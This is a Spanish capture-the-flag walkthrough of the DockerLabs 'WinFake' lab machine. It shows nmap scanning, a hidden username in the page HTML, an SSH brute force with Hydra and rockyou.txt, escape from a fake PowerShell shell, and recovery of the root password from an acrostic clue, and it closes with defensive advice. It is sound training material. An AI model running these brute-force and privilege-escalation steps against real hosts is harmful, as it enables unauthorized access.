# WinFake — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** d1se0  
**Fecha de creación:** 16/07/2025  
**Técnicas:** Hydra · SSH · Fake Windows Shell · Source Code Review · Hidden HTML · Password Discovery

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — usuario oculto](#2-enumeración-web--usuario-oculto)
3. [Fuerza bruta SSH — Hydra](#3-fuerza-bruta-ssh--hydra)
4. [Fake Windows Shell](#4-fake-windows-shell)
5. [Obtención de contraseña root](#5-obtención-de-contraseña-root)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh winfake.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

---

## 2. Enumeración web — usuario oculto

Accedemos al servidor web e inspeccionamos el código fuente.

Encontramos un nombre oculto dentro del `body`:

```text
pipe
```

El nombre parece corresponder a un usuario válido del sistema.

También observamos un elemento oculto:

```html
<article hidden="acrostico inicial"></article>
```

Esto será relevante posteriormente.

---

## 3. Fuerza bruta SSH — Hydra

Realizamos fuerza bruta contra el usuario encontrado:

```bash
hydra -l pipe -P /usr/share/wordlists/rockyou.txt \
ssh://172.17.0.2
```

Resultado:

```text
login: pipe
password: kisses
```

Accedemos mediante SSH:

```bash
ssh pipe@172.17.0.2
```

---

## 4. Fake Windows Shell

Al iniciar sesión observamos una shell falsa simulando un entorno Windows:

```text
Windows PowerShell
PS C:\Users\pipe>
```

Intentamos acceder al directorio root:

```powershell
cd /root
```

Resultado:

```text
PermissionError: [Errno 13] Permission denied: '/root'
```

El error revela el fichero responsable de la simulación:

```text
/usr/local/bin/windows.py
```

Exploramos el script:

```powershell
cd /usr/local/bin
type windows.py
```

Observamos que el programa restringe comandos Linux y simula PowerShell.

También encontramos una sección relevante:

```python
if cmd == "su" and args == ["root"]:
    subprocess.run(["su", "root"])
```

Esto indica que podemos intentar autenticarnos directamente como root.

---

## 5. Obtención de contraseña root

Volvemos a inspeccionar la página web principal.

El elemento oculto:

```html
<article hidden="acrostico inicial"></article>
```

Nos da una pista para formar un acróstico.

Resultado obtenido:

```text
winserverrootfakenews
```

Tras varias pruebas descubrimos la contraseña válida:

```text
WinServerRootFakeNews
```

Cambiamos al usuario root:

```bash
su root
```

Introducimos la contraseña encontrada.

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Información oculta en HTML | Descubrimiento de usuarios |
| Contraseña débil SSH | Acceso inicial |
| Código fuente accesible | Filtración de lógica interna |
| Pistas expuestas en frontend | Descubrimiento de credenciales |
| Contraseña root predecible | Escalada total a root |

**Para defenderse:**

- No ocultar información sensible en HTML.
- Aplicar políticas robustas de contraseñas.
- Evitar exponer lógica crítica en scripts accesibles.
- Implementar autenticación fuerte para usuarios privilegiados.
- Limitar acceso SSH mediante hardening y MFA.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
